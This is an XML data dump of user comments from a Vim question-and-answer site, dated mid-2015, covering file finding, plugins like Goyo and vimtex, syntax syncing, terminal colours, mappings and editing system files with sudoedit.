  <row Id="4854" PostId="3479" Score="1" Text="@EvergreenTree, `:find bar` only finds files whose name starts with `bar` but `:find *bar` also finds files containing `bar` anywhere in their name. Note that this rule also applies to `:edit` and all related commands." CreationDate="2015-05-31T16:55:42.897" UserId="54" />
  <row Id="4855" PostId="3479" Score="0" Text="Ah, that makes sense." CreationDate="2015-05-31T21:05:49.063" UserId="865" />
  <row Id="4856" PostId="26" Score="0" Text="`:so $m`&lt;Tab&gt;  ← extra-short-cut" CreationDate="2015-05-31T21:46:56.867" UserId="2314" />
  <row Id="4857" PostId="3485" Score="0" Text="There's a plugin floating around that does all this automatically and more (IIRC), but I can't remember its name right now." CreationDate="2015-05-31T21:51:31.673" UserId="1577" />
  <row Id="4858" PostId="3485" Score="0" Text="I imagine that there would be, the vim tip pointed to one at http://www.vim.org/scripts/script.php?script_id=1506  In fact, that plugin was based on that vim tip," CreationDate="2015-05-31T22:06:12.043" UserId="865" />
  <row Id="4859" PostId="3476" Score="1" Text="You might be interested in [Goyo](https://github.com/junegunn/goyo.vim), which sort of does what you want. It does more though, and perhaps some stuff that you are not interested in as well (creates a distraction-free environment)." CreationDate="2015-06-01T06:39:49.377" UserId="21" />
  <row Id="4860" PostId="169" Score="4" Text="[sed](https://en.wikipedia.org/wiki/Sed) was invented for this purpose. You figure out which changes you want to make, expressed as substitutions, then run `sed` to perform them. This also works on streams (i.e. file content that has no end because it is being produced)." CreationDate="2015-06-01T08:30:43.110" UserId="846" />
  <row Id="4861" PostId="3487" Score="0" Text="It would depend on the module. Is is widely packaged, or a more obscure module? Is it one file? Or a lot of files? Is the license compatible with your project's license?" CreationDate="2015-06-01T10:46:14.880" UserId="51" />
  <row Id="4863" PostId="3477" Score="0" Text="Sorry if I was not very clear. This question was not about accidentally changing a read only file; I wanted to stop myself from being able to edit the buffer of a file that I did not have write access for. Sometimes I accidentally open system configuration files as a regular user rather than the root user. In this case I don't have write access to the file, so the buffer appears as read only but Vim will still allow me to edit the buffer. When I try to save I cannot because I don't have write access. I wanted Vim to block changes to the buffer in this case." CreationDate="2015-06-01T13:52:36.177" UserId="2283" />
  <row Id="4864" PostId="3487" Score="1" Text="&gt;My guess is that vim uses it's own python that is compiled in it, therefore I cannot really use pip to install these modules.&#xA;&#xA;Vim may use dynamic linked python more then one version. See `he: python-2-and-3`&#xA;&#xA;Of course I can build vim myself with any version of python (py2 or py3) or with both of them." CreationDate="2015-06-01T14:06:30.180" UserId="1145" />
  <row Id="4865" PostId="3489" Score="1" Text="Obligatory article: [Oil and vinegar - split windows and the project drawer](http://vimcasts.org/blog/2013/01/oil-and-vinegar-split-windows-and-project-drawer/)" CreationDate="2015-06-01T14:38:39.060" UserId="778" />
  <row Id="4866" PostId="3489" Score="0" Text="@Peter: Thanks for your comment, the article is pretty interesting and I'll probably give a try to netrw and the concept of split explorer. I think I understand the advantage of what is explained in the article but the problem is that it doesn't actually solve my problem it just advise to change the tool I use. I'm not against changing my habits but I'd like to solve my problem first and then try a new tool :)" CreationDate="2015-06-01T15:09:36.797" UserId="1841" />
  <row Id="4867" PostId="3491" Score="0" Text="You can set a very low `updatecount`, so that Vim will write to the swap file very often. This obviously may cause slowdowns." CreationDate="2015-06-01T15:13:24.257" UserId="51" />
  <row Id="4868" PostId="3493" Score="0" Text="`b:changedtick` could also be useful in this context: it counts &quot;[t]he total number of changes to the current buffer [...] incremented for each change. An undo command is also a change in this case&quot;.  FWIW." CreationDate="2015-06-01T17:32:42.597" UserId="1577" />
  <row Id="4870" PostId="3477" Score="0" Text="Ah, I see. I got the idea that you wanted this as a failsafe. Disregard my answer then :)" CreationDate="2015-06-01T18:34:29.180" UserId="2311" />
  <row Id="4872" PostId="3489" Score="0" Text="Related, unanswered question on SU: http://superuser.com/q/821720/334516. Maybe `map d&lt;cr&gt; &lt;cr&gt;:NERDTreeClose&lt;cr&gt;` for the mapping?" CreationDate="2015-06-01T20:36:26.413" UserId="205" />
  <row Id="4873" PostId="3489" Score="0" Text="@muru: Thanks you, your mapping works fine and it seems less ugly than mine :) About the question on SU, I'm not sure it is totally related since he wants to open the file in the buffer of NERDTree whereas I want to open it in a new buffer and then close NERDTree buffer: He ends up with a split windows whereas I want to end up with 2 buffers not in a split window." CreationDate="2015-06-02T07:37:16.133" UserId="1841" />
  <row Id="4874" PostId="3496" Score="0" Text="So did you install solarized on the VM?" CreationDate="2015-06-02T07:41:28.433" UserId="51" />
  <row Id="4875" PostId="3496" Score="0" Text="yes, Bundle 'altercation/vim-colors-solarized'" CreationDate="2015-06-02T07:43:37.630" UserId="2332" />
  <row Id="4876" PostId="3416" Score="0" Text="This is not exactly what I was hoping, but it is probably as good as it gets. Indeed from features=normal to features=huge, a few options more options are added. Thanks anyway." CreationDate="2015-06-02T08:30:19.247" UserId="2170" />
  <row Id="4877" PostId="3496" Score="1" Text="If you set the colorscheme manually does it work? aka `:set colorscheme solarized`? If not, then there was a problem with installation." CreationDate="2015-06-02T18:44:23.360" UserId="14" />
  <row Id="4878" PostId="3462" Score="0" Text="Are you using Vim's built in JS syntax or the `vim-javascript plugin`?" CreationDate="2015-06-02T18:46:41.037" UserId="14" />
  <row Id="4879" PostId="2363" Score="0" Text="I can't find the documentation for the `:set &lt;M-j&gt;=\ej` part. What should I search for?" CreationDate="2015-06-03T01:05:51.887" UserId="2334" />
  <row Id="4880" PostId="3496" Score="0" Text="`:colorscheme solarized` is works, but background color doesn't change." CreationDate="2015-06-03T01:46:27.947" UserId="2332" />
  <row Id="4881" PostId="3499" Score="0" Text="So, building on your answer: to get the full path as the OP requested, you'd do something like `Ctrl-r =expand('%:p')`.  This uses the [= register](http://vimdoc.sourceforge.net/htmldoc/change.html#quote_=)." CreationDate="2015-06-03T05:25:28.907" UserId="1577" />
  <row Id="4882" PostId="3501" Score="1" Text="This would pointlessly obliterate register `a`.  Try something like this instead: `cnoremap &lt;M-q&gt; &lt;C-r&gt;=fnameescape(expand('%:p'))&lt;CR&gt;`" CreationDate="2015-06-03T09:05:13.527" UserId="1577" />
  <row Id="4883" PostId="3462" Score="0" Text="No additional plugins, didn't even think about installing one. Think it worth trying?" CreationDate="2015-06-03T10:47:14.997" UserId="237" />
  <row Id="4884" PostId="3496" Score="0" Text="Is your terminal _really_ 256 colors? What is the output of `echo $TERM`?" CreationDate="2015-06-03T11:41:23.660" UserId="1018" />
  <row Id="4885" PostId="3496" Score="0" Text="`xterm-256color`" CreationDate="2015-06-03T12:45:07.483" UserId="2332" />
  <row Id="4887" PostId="3509" Score="2" Text="@lcd047: In what way does this not answer the question? The question was to find a solution to &quot;autocomplete the arguments of a function (or show them at least.)&quot;. I suggested a solution that would show the arguments of a function. You proposed the completion of arguments, I proposed the showing of them. The questioner can pick his preference. I don't see the problem here." CreationDate="2015-06-04T04:05:37.557" UserId="246" />
  <row Id="4888" PostId="3512" Score="0" Text="Do you want to use syntax folding *and* comment folding? Or *only* comment folding?" CreationDate="2015-06-04T08:25:57.940" UserId="51" />
  <row Id="4889" PostId="3512" Score="0" Text="@Carpetsmoker, syntax folding + comment folding would be ok if one could say 'open all folds, except for comments'. Otherwise, comment folding without syntax folding would be fine as well." CreationDate="2015-06-04T09:38:08.527" UserId="2357" />
  <row Id="4890" PostId="3505" Score="0" Text="You mentioned 27 Vim servers running. I've never run Vim server. Would you offer some insight to your workflow using Vim servers. Comparatively I use Vim with TMUX, opening files is a matter of TMUX copy/paste and if in a GUI environment (open Vim from gui app) it spawns a MacVIM instance. Would be cool if it went to my running terminal Vim instance instead. Then again most external editor implementations monitor when the process exits before thinking the file is completed. But the server idea might be nice in things like IDE's which have crappy editors built in and need Vim to be effective." CreationDate="2015-06-04T12:31:34.713" UserId="544" />
  <row Id="4891" PostId="3514" Score="0" Text="Why do you want to trigger a function when entering / leaving command mode, rather than entering / leaving insert mode?" CreationDate="2015-06-04T12:59:27.767" UserId="1577" />
  <row Id="4892" PostId="3515" Score="0" Text="Does this misfire when using the expression register in Command-line mode?" CreationDate="2015-06-04T13:14:59.433" UserId="64" />
  <row Id="4893" PostId="3514" Score="0" Text="If relativenumbers are on in normal mode and I hit `:` then my range (`.,+3`) is more complicated then actual line numbers which I would see if `norelativenumbers` was set. and so the request that when switching into command mode to swap the relative numbers setting and put it back when leaving. This is how the plugin works for insert/normal mode switching but vim doesn't provide a normal/command event." CreationDate="2015-06-04T15:38:51.440" UserId="544" />
  <row Id="4894" PostId="3454" Score="1" Text="@EvergreenTree Note that there's a section in the [vim-notes help](https://github.com/xolox/vim-notes#txtfmt) on embedding Txtfmt highlighting within notes. More generally, the Txtfmt plugin supports &quot;nesting&quot; Txtfmt highlighting within other types of syntax regions. You could even highlight your C comments if you really wanted to. ;-)" CreationDate="2015-06-04T15:48:09.430" UserId="2281" />
  <row Id="4897" PostId="3515" Score="0" Text="Unfortunately this is not perfect. It will now trigger the `&lt;Esc&gt;` map when you press the up arrow (since they use terminal ESC sequences)." CreationDate="2015-06-05T01:25:21.313" UserId="544" />
  <row Id="4898" PostId="3514" Score="0" Text="Note that the 'command-mode' term, while not widely used, actually means 'normal mode'. What you want is 'command-line mode' (since you add the `:` to explain, the idea gets through, though)." CreationDate="2015-06-05T08:13:51.073" UserId="1800" />
  <row Id="4899" PostId="3515" Score="0" Text="@Sukima Confirmed ... I need to meditate on a solution..." CreationDate="2015-06-05T08:51:07.373" UserId="51" />
  <row Id="4900" PostId="3514" Score="0" Text="I edited it. To be fair in my 20 some years reading the Vim docs I don't recall a reference to _command-line mode_. I have seen normal, insert, command (from `cmap` or command mapping style), and ex modes. The last (ex) is usually over loaded to mean either the command line from `:` or the batch mode from `Q`." CreationDate="2015-06-05T12:29:14.730" UserId="544" />
  <row Id="4901" PostId="3514" Score="0" Text="Well, just run these commands in vim:&#xA;&#xA;&#xA;    `:h command-mode`&#xA;&#xA;&#xA;    `:h command-line-mode`" CreationDate="2015-06-05T12:31:44.157" UserId="1800" />
  <row Id="4902" PostId="3523" Score="3" Text="I use `Ctrl+g` for this" CreationDate="2015-06-05T16:42:36.170" UserId="500" />
  <row Id="4903" PostId="3523" Score="0" Text="Which is the same as `:file` :-) I wanted to give that as an answer, but is doesn't show the amount of characers. I'm not sure how to get *exactly* that line..." CreationDate="2015-06-05T17:29:34.103" UserId="51" />
  <row Id="4904" PostId="3523" Score="3" Text="You can display this information in your statusline with `let &amp;statusline = '&quot;%f&quot; %{line(&quot;$&quot;)}L, %{line2byte(line(&quot;$&quot;))}C'`. You can also make a mapping to echo this: `nnoremap &lt;Leader&gt;fi :echo '&quot;' . expand(&quot;%&quot;) . '&quot; ' . line(&quot;$&quot;) . &quot;L, &quot; . line2byte(line(&quot;$&quot;)) . &quot;C&quot;&lt;CR&gt;`" CreationDate="2015-06-05T18:32:23.723" UserId="1306" />
  <row Id="4905" PostId="3523" Score="0" Text="@Carpetsmoker I think it shows bytes, not characters, despite the &quot;C&quot;. I haven't looked carefully but for me the number seems to agree with output from `wc -c`, not from `wc -m`." CreationDate="2015-06-05T18:34:51.677" UserId="1306" />
  <row Id="4906" PostId="169" Score="0" Text="I have aliased `less`, `more` and `man` to `vimpager`.&#xA;https://github.com/rkitover/vimpager" CreationDate="2015-06-06T08:16:12.783" UserId="1145" />
  <row Id="4907" PostId="3531" Score="0" Text="But echo is not going to make any replacements for me right? How do I do the search and replace thingy with variables?" CreationDate="2015-06-06T08:29:43.960" UserId="2369" />
  <row Id="4908" PostId="3530" Score="2" Text="That might be a dumb question but why do you want to create such a function? The `substitute` command isn't satisfying enough for you or it's just for vimscript training purpose?" CreationDate="2015-06-06T12:06:41.447" UserId="1841" />
  <row Id="4909" PostId="3529" Score="3" Text="You can use `execute '/' . @l` if you want exactly the same behaviour as typing `/&lt;C-r&gt;l`. `search()` behaves subtly different on some points (which may be considered desirable or undesirable depending on what you're doing)." CreationDate="2015-06-06T13:01:39.503" UserId="51" />
  <row Id="4910" PostId="3531" Score="0" Text="@caffeinemachine your title queston only asks about how arguments work, which this answer covers. It isn't very clear from your question that you mostly care about the actual replacement. Perhaps consider re-wording your title and adding clarification to the question." CreationDate="2015-06-06T15:37:51.353" UserId="227" />
  <row Id="4911" PostId="3438" Score="0" Text="You have a plugin that maps `Enter` to something else." CreationDate="2015-06-06T16:17:17.273" UserId="1577" />
  <row Id="4912" PostId="3530" Score="2" Text="It's just for training purpose." CreationDate="2015-06-06T18:39:18.137" UserId="2369" />
  <row Id="4913" PostId="3531" Score="0" Text="I agree. The title and the body of the question were rather different. But the problem is now solved." CreationDate="2015-06-06T18:40:50.140" UserId="2369" />
  <row Id="4914" PostId="3534" Score="0" Text="That regexp doesn't seem to work?" CreationDate="2015-06-06T19:06:05.417" UserId="51" />
  <row Id="4915" PostId="3534" Score="0" Text="@Carpetsmoker what do you mean?" CreationDate="2015-06-06T19:07:08.927" UserId="342" />
  <row Id="4916" PostId="3534" Score="0" Text="What are you supposed to do if two such headers are more than 400 KB apart?" CreationDate="2015-06-06T19:17:41.857" UserId="1577" />
  <row Id="4917" PostId="3534" Score="0" Text="@lcd047 I will upload one. Any way, this is unlikely to happen." CreationDate="2015-06-06T19:29:43.220" UserId="342" />
  <row Id="4918" PostId="3534" Score="0" Text="Do you want to round up or down?  That is, if the 400 KB boundary falls in the middle of a section, do you want that section included or not?" CreationDate="2015-06-06T19:32:12.393" UserId="1577" />
  <row Id="4919" PostId="3534" Score="0" Text="@lcd047 I think down will be the best." CreationDate="2015-06-06T19:34:42.357" UserId="342" />
  <row Id="4920" PostId="3497" Score="0" Text="I created a new file erb.vim as you mentioned, then open an erb file, tried `ds=`, it didn't work. What might be wrong?" CreationDate="2015-06-07T00:17:52.180" UserId="2289" />
  <row Id="4921" PostId="3538" Score="0" Text="Very helpful. Can you tell me just one thing though. Is it necessary use a variable of the type `l:save_cursor`. Woudn't just `save_cursor` suffice?" CreationDate="2015-06-07T02:41:04.913" UserId="2369" />
  <row Id="4922" PostId="3538" Score="2" Text="@caffeinemachine Yeah, the `l:` is mostly optional, I like typing it anyway, but you don't have to ;-) Just remember that if a special (`v:`) variable exists it takes precedence." CreationDate="2015-06-07T02:45:02.610" UserId="51" />
  <row Id="4923" PostId="3530" Score="0" Text="oh ok then have fun with that :)" CreationDate="2015-06-07T07:55:37.607" UserId="1841" />
  <row Id="4924" PostId="3536" Score="0" Text="Common practice is to use `s:` instead of `&lt;SID&gt;` where possible. The latter is required in mappings, but it's better to use the former in function definitions and commands." CreationDate="2015-06-07T15:04:38.660" UserId="64" />
  <row Id="4925" PostId="3536" Score="0" Text="@tommcdo I believe there's a mapping at the end of the blockquote?" CreationDate="2015-06-07T15:12:37.110" UserId="1577" />
  <row Id="4926" PostId="3454" Score="0" Text="This solve the problem ! thanks !" CreationDate="2015-06-07T18:55:00.607" UserId="2145" />
  <row Id="4927" PostId="3541" Score="0" Text="Upvoted purely for `awk` solution! :)" CreationDate="2015-06-07T22:27:57.000" UserId="1800" />
  <row Id="4928" PostId="3454" Score="0" Text="Excellent! Glad to help." CreationDate="2015-06-08T01:04:49.233" UserId="2281" />
  <row Id="4929" PostId="1915" Score="2" Text="also check this answer: http://stackoverflow.com/a/16407391/164835" CreationDate="2015-06-08T13:08:01.617" UserId="1569" />
  <row Id="4930" PostId="3438" Score="0" Text="the mapping is introduced by the line `map &lt;C-m&gt; :tnext&lt;CR&gt;`. When i remove this line, there is no mapping for &lt;CR&gt; but when i add it, there is  mapping for &lt;CR&gt; . Any idea why?" CreationDate="2015-06-08T13:58:43.037" UserId="2277" />
  <row Id="4931" PostId="3438" Score="0" Text="I got the issue. http://stackoverflow.com/questions/3935970/vim-how-to-map-ctrl-m-without-affecting-return-keypress-as-well" CreationDate="2015-06-08T14:01:32.330" UserId="2277" />
  <row Id="4932" PostId="3497" Score="0" Text="@canoe There are 2 problems. 1) I had a typo in the mapping, It should be `nmap` instead of `nnmap`. 2) The `'filetype'` for *.erb files is `eruby` not `erb`. So you will need to name your file: `~/.vim/after/ftplugin/eruby.vim`" CreationDate="2015-06-08T14:58:13.293" UserId="778" />
  <row Id="4933" PostId="3476" Score="0" Text="Thanks, Goyo looks very nice :)" CreationDate="2015-06-08T15:34:38.883" UserId="2311" />
  <row Id="4934" PostId="3483" Score="0" Text="Looks good but I went the Goyo way. Thanks anyway, perhaps in another use case I might get back to your plugin." CreationDate="2015-06-08T15:35:14.500" UserId="2311" />
  <row Id="4935" PostId="3543" Score="0" Text="Vim already knows which `$` characters are opening and which are closing because it highlights math segments. Could the information used by highlighting be leveraged for that improved `%` command?" CreationDate="2015-06-08T21:53:19.827" UserId="8" />
  <row Id="4936" PostId="3543" Score="0" Text="If you open `$VIMRUNTIME/syntax/tex.vim` and search for `\$`s (heh), you'll see comments like this: «The $..$ and $$..$$ make for impossible sync patterns (one can't tell if a &quot;$$&quot; starts or stops a math zone by itself) The following grouptheres coupled with minlines above help improve the odds of good syncing.» and «4. There is no match-syncing for $...$ and $$...$$; hence large equation blocks constructed that way may exhibit syncing problems (there's no difference between begin/end patterns)». Maybe if you use text objects instead, e.g.: https://github.com/gibiansky/vim-latex-objects" CreationDate="2015-06-08T22:24:25.057" UserId="1800" />
  <row Id="4937" PostId="3543" Score="0" Text="To reuse existing syntax highlighting, but still with text-objects, you also have: https://github.com/kana/vim-textobj-syntax, which defines a `textobj-syntax-i` as &quot;the syntax highlighted item under the cursor&quot;. Then, for example, you can visually select the `$...$` as math object, and if you hit `o`, move cursor to the other end of the visual selection. But still doesn't answer your suggestion of implementing `%` from  syntax highlight rules ... I would like to see a vim guru coming up with some idea." CreationDate="2015-06-08T22:31:03.657" UserId="1800" />
  <row Id="4938" PostId="3544" Score="0" Text="Thanks, Karl, for your explanation. I understand, now, that I won't be adding a couple lines to my .vimrc to implement this functionality. I use vim-latex as my current vim plugin for editing LaTeX files. I'm considering forking vim-latex to improve it. If I do this, I might introduce something like your ``s:highlight_matching_pair`` or LaTeX-Box's ``s:FindMatchingPair``. I see that both plugins require a separate logic branch (if statement) to process if the delimiter being matched is a '$', or not. It's special." CreationDate="2015-06-08T22:34:59.113" UserId="2062" />
  <row Id="4940" PostId="3544" Score="0" Text="Personally I don't recommend forking vim-latex (aka LaTeX-Suite), instead I would suggest you open a pull request [here](https://github.com/vim-latex/vim-latex). Personally I don't like vim-latex, mostly because it is huge and difficult to improve and customize." CreationDate="2015-06-09T06:29:47.867" UserId="21" />
  <row Id="4941" PostId="3543" Score="0" Text="Both vimtex and LaTeX-Box use the syntax group to determine the boundaries of `$...$` as suggested by @Gilles." CreationDate="2015-06-09T06:31:37.840" UserId="21" />
  <row Id="4943" PostId="3552" Score="0" Text="What do you mean with &quot;navigate to the first diff&quot;?" CreationDate="2015-06-09T07:21:08.340" UserId="51" />
  <row Id="4944" PostId="3552" Score="0" Text="I mean jump to the first diff section, like command `]c` does." CreationDate="2015-06-09T07:26:33.887" UserId="477" />
  <row Id="4945" PostId="3543" Score="0" Text="Another reason to use vimtex, then :) Thanks for the info." CreationDate="2015-06-09T08:41:03.823" UserId="1800" />
  <row Id="4946" PostId="3553" Score="0" Text="I've been using `autocmd BufEnter * :syntax sync fromstart` for ages. It's not just Scheme where this will fix problems (IMHO this should be the default)." CreationDate="2015-06-09T09:08:20.077" UserId="51" />
  <row Id="4947" PostId="3553" Score="5" Text="@Carpetsmoker Things are not as clear-cut as you make them seem.  Highlighting for some languages can be _really_ slow, and that might be amplified by the fact that the new regexp engine is still buggy.  Sometimes you can workaround the slowness by setting `re=1` to force the use of the old engine, but sometimes there just isn't any solution.  Running `sync fromstart` in that situation would be a pretty bad idea." CreationDate="2015-06-09T09:33:09.713" UserId="1577" />
  <row Id="4948" PostId="3557" Score="1" Text="Try this:&#xA;`/&lt;ctr-v&gt;u0303` type in normal mode `/` - start search `&lt;Ctr-u&gt;v` - init utf-8 code input `0303` - hexonal code combine character.&#xA;Works fine for me." CreationDate="2015-06-09T15:21:20.330" UserId="1145" />
  <row Id="4949" PostId="3557" Score="1" Text="Works great - thanks!  `:g/&lt;Ctrl-V&gt;u0303` also worked from the command line.  Please add as an answer so I can accept it.  Much appreciated!  (Vim docs at http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit )" CreationDate="2015-06-09T16:06:12.100" UserId="1430" />
  <row Id="4950" PostId="3554" Score="1" Text="You could put that as an autocommand only when `'diff'` is on, I suppose. That seems harmless enough... `:help vimdiff` gives an example of how (`if &amp;diff`)" CreationDate="2015-06-09T17:21:25.347" UserId="31" />
  <row Id="4951" PostId="3556" Score="0" Text="You could also use `:3,$v/foo/d` for lines that do not match a pattern. `:h vglobal`" CreationDate="2015-06-09T19:32:28.653" UserId="1453" />
  <row Id="4952" PostId="3553" Score="0" Text="If `:syntax sync fromstart` causes too much delay, perhaps I should disable the default feature all together. And find a way to toggle `:syntax sync fromstart`. That way, I can avoid delay and still check for balanced parentheses via a command/shortcut.&#xA;&#xA;Do you know how I can set up a command/shortcut combo to toggle &quot;:syntax sync fromstart&quot;?" CreationDate="2015-06-09T22:03:42.863" UserId="2407" />
  <row Id="4954" PostId="3553" Score="0" Text="Toggling is a little tricky because the type of syntax syncing used for each filetype is set by the filetype's syntax file and varies with the filetype. I think the following will work, though. `map &lt;silent&gt; &lt;F8&gt; :if exists(&quot;g:fromstart&quot;) &lt;bar&gt; syn off &lt;bar&gt; syn on &lt;bar&gt; unlet g:fromstart &lt;bar&gt; else &lt;bar&gt; syn sync fromstart &lt;bar&gt; let g:fromstart=1 &lt;bar&gt; endif &lt;cr&gt;`" CreationDate="2015-06-10T05:02:21.147" UserId="2055" />
  <row Id="4957" PostId="3560" Score="0" Text="I know a lot has changed in Vim since 2006. I was more surprised that nobody has had this question (or at least, asked it in a place that I was able to find within a few minutes of googling) since then..." CreationDate="2015-06-10T16:07:53.920" UserId="1688" />
  <row Id="4959" PostId="3565" Score="7" Text="@SuperScript `S` is a synonym for `cc`" CreationDate="2015-06-11T03:58:56.317" UserId="46" />
  <row Id="4960" PostId="3561" Score="4" Text="On a side note: `sudo vim file` is better written as `sudo -e file` (provided that you set the environment variable `EDITOR=vim`)." CreationDate="2015-06-11T04:31:38.123" UserId="1577" />
  <row Id="4961" PostId="149" Score="0" Text="Why not consider ed for large files?" CreationDate="2015-06-11T06:22:30.560" UserId="2425" />
  <row Id="4963" PostId="3549" Score="0" Text="I was hoping that I could use the keywords I already generated.  Is that possible?&#xA;&#xA;I also don't understand some of the syntax.  What is the `\v` at the start of the match string?  And, what does the escaped-pipe, `\|` mean?" CreationDate="2015-06-11T15:38:03.440" UserId="2399" />
  <row Id="4964" PostId="3568" Score="0" Text="-1 for suggesting plugin addiction recovery (J/K, no downvote really)" CreationDate="2015-06-11T18:57:34.493" UserId="2221" />
  <row Id="4965" PostId="3225" Score="1" Text="@Gilles why don't you put that in an answer?  It's better for Googlers and our site stats." CreationDate="2015-06-11T19:01:44.337" UserId="2221" />
  <row Id="4966" PostId="3225" Score="1" Text="@SuperScript I've researched this a bit more and posted an answer." CreationDate="2015-06-12T00:08:43.723" UserId="8" />
  <row Id="4967" PostId="3568" Score="3" Text="Note that this doesn't run vim as root, like `sudo vim` does.  The editing happens as your normal user and then sudo handles updating the original file." CreationDate="2015-06-12T02:35:35.500" UserId="15" />
  <row Id="4968" PostId="3175" Score="1" Text="This is something I want as well. If you're using ack or ag, performance shouldn't be an issue. Plus if you're using neovim, it should be async, so there shouldn't be any block either." CreationDate="2015-06-12T03:42:36.433" UserId="2442" />
  <row Id="4969" PostId="3175" Score="0" Text="Finally I use ag as ctrlp command :)" CreationDate="2015-06-12T04:51:49.950" UserId="1821" />
  <row Id="4970" PostId="3566" Score="2" Text="This is useful for the `I did a bunch of editing and then realized I should have used sudoedit`, but for the general case I would suggest using `sudo -e`/`sudoedit`." CreationDate="2015-06-12T17:26:42.277" UserId="15" />
  <row Id="4971" PostId="3573" Score="0" Text="I was hoping to avoid a plugin, but if no other answers appear in the next several hours, I'll mark this one as accepted.  Thanks!" CreationDate="2015-06-12T18:35:24.263" UserId="2452" />
  <row Id="4972" PostId="3571" Score="0" Text="This was definitely better than what I had, but while it didn't give me exactly what I wanted (due to not working with my mappings for quote-wrapping), it didn't require much tweaking to make it do what I needed. I changed `'pattern': '\$\w\+\&gt;'` to `'pattern': '\$\?\w\+\&gt;'`, `'select': [ 'av']` to `'select': [ 'aw']`, and altered my mapping from `viw&lt;esc&gt;a&quot;&lt;esc&gt;hbi&quot;&lt;esc&gt;lel` to ``vaw&lt;esc&gt;`&gt;a&quot;&lt;esc&gt;&quot;&lt;i`&lt;esc&gt;f&quot;``. Accepting since it did answer the root question, even if it didn't quite work for my specific case." CreationDate="2015-06-12T18:58:44.347" UserId="1166" />
  <row Id="4973" PostId="3573" Score="0" Text="@Jeff I can understand that you don't want plug-ins but I think that for doing what you want that's the best way to save you a lot of vimscript work. I hope a vim master will provide you a better solution. ;)" CreationDate="2015-06-12T19:50:37.197" UserId="1841" />
  <row Id="4974" PostId="3549" Score="0" Text="@Stephen the `\v` is the [very magic]( http://vim.wikia.com/wiki/Simplifying_regular_expressions_using_magic_and_no-magic) regex switch it makes all characters having a special meaning excepted `[a-zA-Z0-9]` and `_`" CreationDate="2015-06-13T09:54:05.510" UserId="1841" />
  <row Id="4975" PostId="3578" Score="0" Text="Thanks for your suggestion. I edited the above with remarks regarding `xterm-256color`. I followed through with your procedure to find terminal type already set thus." CreationDate="2015-06-13T23:08:25.730" UserId="783" />
  <row Id="4976" PostId="3577" Score="0" Text="Thanks for the idea, Jeff. I edited my question with remarks regarding `xterm-256color`. Setting $TERM via export had no effect." CreationDate="2015-06-13T23:09:42.357" UserId="783" />
  <row Id="4977" PostId="3576" Score="0" Text="Your $TERM is already set to what is generally considered 'correct' on modern systems - 256-color enabled. So the t_Co option, which is normally for compatibility with older terminals, shouldn't be necessary. What if you comment out both configuration lines?" CreationDate="2015-06-14T00:01:58.167" UserId="212" />
  <row Id="4978" PostId="3576" Score="0" Text="@David Commenting out both config lines looks the same as commenting out `set term=xterm`." CreationDate="2015-06-14T02:06:58.527" UserId="783" />
  <row Id="4979" PostId="3583" Score="4" Text="Just to be sure that I understand your question: you regularly type by mistake some sequence like `144477@@` or `99999.` and you want to stop those executions when the number is too big? Am I right? (I have to ask because that seems a little bit weird to me, I never had this problem)" CreationDate="2015-06-14T07:48:07.250" UserId="1841" />
  <row Id="4980" PostId="3583" Score="3" Text="Why not… pay attention on what you do?" CreationDate="2015-06-14T12:20:26.200" UserId="54" />
  <row Id="4981" PostId="3588" Score="1" Text="Thanks that's exactly what I was looking for! I didn't know the `getpos()` and `getline()` commands. Also as you answered the bonus question you deserve a [dancing cookie](http://imgur.com/gallery/j2PQoWh) ;)" CreationDate="2015-06-14T14:57:00.300" UserId="1841" />
  <row Id="4982" PostId="3588" Score="0" Text="A cookie, yay :)" CreationDate="2015-06-14T15:04:17.923" UserId="1800" />
  <row Id="4983" PostId="3583" Score="0" Text="Use persistent undo and increase `undolevels`.  It's a great safety net, and a pretty useful feature by itself." CreationDate="2015-06-14T15:55:30.557" UserId="1577" />
  <row Id="4984" PostId="3588" Score="1" Text="@statox Bookmark this: `:help function-list`.  It's a very useful reference.  Also, +1 for the mention of &quot;Practical Vim&quot;. :)" CreationDate="2015-06-14T16:01:27.293" UserId="1577" />
  <row Id="4985" PostId="3588" Score="0" Text="@lcd047: Wow thanks!! I wish I knew this help entry before, that's so nice to have this list here. Vim documentation is really amazing! Also yay I'm pretty new to vim and &quot;Practical Vim&quot; is my Bible at the moment :)" CreationDate="2015-06-14T16:07:00.060" UserId="1841" />
  <row Id="4986" PostId="3586" Score="0" Text="That's clear:  I've just got vim-common, vim-runtime and vim-tiny under my default installation of kubuntu 14.04.  &quot;There is only one alternative in link group vi (providing /usr/bin/vi): /usr/bin/vim.tiny &quot;  &#xA;Nothing to configure.&#xA;I suppose that means I've got vim.tiny, and that's it out of the three (VI, VIM and EMACS)" CreationDate="2015-06-14T16:49:48.333" UserId="2466" />
  <row Id="4987" PostId="3585" Score="0" Text="FYI: this will require the use of `guifg` and `guibg`. OP's colorscheme uses `ctermfg` and `ctermbg`." CreationDate="2015-06-14T17:42:00.763" UserId="578" />
  <row Id="4988" PostId="3588" Score="0" Text="@Laser also a quickest way to empty the `a` register in normal mode is to record an empty macro with `qaq` maybe it's less elegant than your solution but it works ;) Also your solution can be used in a vimscript whereas I don't think it's possible with mine." CreationDate="2015-06-14T18:18:43.587" UserId="1841" />
  <row Id="4989" PostId="3583" Score="2" Text="@statox yes, that's right. romainl has a valid point too, but it seems irrelevant to the question. The question remains, and it may not be as &quot;serious&quot; as other questions, but a question it is nonetheless. I simply think that it makes sense to be able to specify an upper bound on this to prevent accidental denial-of-service. As for the suggestion about undolevels, yes that can be relevant if this overflows undo buffer as well, I hadn't considered it either. (A not so contrived example -- I have a 60% keyboard, the top border row is numbers. I pick it up with my hand. Forget to unplug it. etc.)" CreationDate="2015-06-14T18:29:59.667" UserId="390" />
  <row Id="4992" PostId="3583" Score="0" Text="@Steven I understand that was a real question, I wasn't  criticizing it I just wanted to be sure I understand. Of course as long at it is on topic and useful for other people your questions is worth being asked and answered. Unfortunately I don't have a good answer and I also think romainl has a good point but I hope you're satisfied with the answer you found or someone will provide you what you're expecting :)" CreationDate="2015-06-14T20:38:31.623" UserId="1841" />
  <row Id="4994" PostId="3596" Score="0" Text="That did it! I don't have enough of a reputation to up vote, but I've marked it as the answer." CreationDate="2015-06-14T23:43:35.340" UserId="2475" />
  <row Id="4995" PostId="3593" Score="1" Text="Welcome to Vi.SX! This answer currently looks like a comment to one of the other answers. You will be able to post comments once your reputation reaches 50. Until then, try to flesh out this answer more so that it can stand on its own." CreationDate="2015-06-15T00:53:48.520" UserId="227" />
